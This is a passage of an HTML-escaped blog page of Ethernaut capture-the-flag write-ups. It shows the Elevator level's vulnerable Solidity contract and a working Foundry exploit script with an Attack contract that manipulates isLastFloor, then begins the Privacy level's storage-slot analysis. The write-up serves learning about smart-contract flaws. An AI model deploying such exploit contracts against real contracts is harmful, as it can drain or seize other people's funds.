&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;ReentrancySolve.s.sol:ReentrancySolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;11-elevator&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#11-elevator&quot; aria-label=&quot;Anchor link for: 11-elevator&quot;&gt;11 Elevator&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Elevator.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Building &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isLastFloor&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Elevator {
&lt;&#x2F;span&gt;&lt;span&gt;  bool public top&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint public floor&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;goTo&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint _floor&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    Building building &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Building&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;! &lt;&#x2F;span&gt;&lt;span&gt;building&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isLastFloor&lt;&#x2F;span&gt;&lt;span&gt;(_floor)) {
&lt;&#x2F;span&gt;&lt;span&gt;      floor &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_floor&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      top &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;building&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isLastFloor&lt;&#x2F;span&gt;&lt;span&gt;(floor)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;We need to get to the top floor, i.e make the top boolean to &lt;code&gt;true&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;The Elevator calling the &lt;code&gt;isLastFloor()&lt;&#x2F;code&gt; function on &lt;code&gt;msg.sender&lt;&#x2F;code&gt; which is insecure. Dont trust the unknown libraries or contract while making the calls.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;top&lt;&#x2F;code&gt; variable is being updated upon the return value of the &lt;code&gt;isLastFloor()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;But, To pass the &lt;code&gt;if&lt;&#x2F;code&gt; condition the &lt;code&gt;isLastFloor()&lt;&#x2F;code&gt; should return the &lt;code&gt;false&lt;&#x2F;code&gt;. But the &lt;code&gt;top&lt;&#x2F;code&gt; will become &lt;code&gt;false&lt;&#x2F;code&gt; only if it results false everytime.&lt;&#x2F;li&gt;
&lt;li&gt;We can observe that the &lt;code&gt;isLastFloor()&lt;&#x2F;code&gt; function is being called twice. So, we can write a contract which implements &lt;code&gt;isLastFloor()&lt;&#x2F;code&gt; function is such a way that is returns &lt;code&gt;false&lt;&#x2F;code&gt; on first call and &lt;code&gt;true&lt;&#x2F;code&gt; on second call.&lt;&#x2F;li&gt;
&lt;li&gt;So, that the &lt;code&gt;if&lt;&#x2F;code&gt; condition satifsies and &lt;code&gt;top&lt;&#x2F;code&gt; will be updated to true.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;ElevatorSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Elevator} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Elevator.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract ElevatorSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Elevator public elevator &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Elevator&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa32a12f573871eE4C1B6d2E9B8BA424d4cD01718&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Top : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;elevator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;top&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Top : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;elevator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;top&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    Elevator public elevator &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Elevator&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa32a12f573871eE4C1B6d2E9B8BA424d4cD01718&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint public callCount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public payable&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        elevator&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;goTo&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isLastFloor&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;        callCount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(callCount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;ElevatorSolve.s.sol:ElevatorSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;12-privacy&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#12-privacy&quot; aria-label=&quot;Anchor link for: 12-privacy&quot;&gt;12 Privacy&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Privacy.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Privacy {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  bool public locked &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint256 public ID &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;timestamp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint8 private flattening &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint8 private denomination &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;255&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint16 private awkwardness &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint16&lt;&#x2F;span&gt;&lt;span&gt;(block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;timestamp)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  bytes32[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;] private data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(bytes32[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;] memory _data) {
&lt;&#x2F;span&gt;&lt;span&gt;    data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;unlock&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes16 _key&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(_key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes16&lt;&#x2F;span&gt;&lt;span&gt;(data[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    locked &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;*
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    A bunch of super advanced solidity algorithms...
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;      ,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;      .,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;      *.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^         ,---&#x2F;V\
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;      `*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.    ~|__(o.o)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;      ^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;  UU  UU
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;  *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;We need to unlock the contract, i.e call &lt;code&gt;unlock()&lt;&#x2F;code&gt; function with right password.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;This challenge is similar to &lt;code&gt;Vault&lt;&#x2F;code&gt;. But we need to understand the storage layout of this contract and query the exact passwor storage slot of the contract.&lt;&#x2F;li&gt;
&lt;li&gt;The storage layout of contract as follows :&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;bool public locked = true;                      &#x2F;&#x2F; slot 0
&lt;&#x2F;span&gt;&lt;span&gt;uint256 public ID = block.timestamp;             &#x2F;&#x2F; slot 1
&lt;&#x2F;span&gt;&lt;span&gt;uint8 private flattening = 10;                   &#x2F;&#x2F; slot 2
&lt;&#x2F;span&gt;&lt;span&gt;uint8 private denomination = 255;                &#x2F;&#x2F; slot 2
&lt;&#x2F;span&gt;&lt;span&gt;uint16 private awkwardness = uint16(block.timestamp);  &#x2F;&#x2F; slot 2
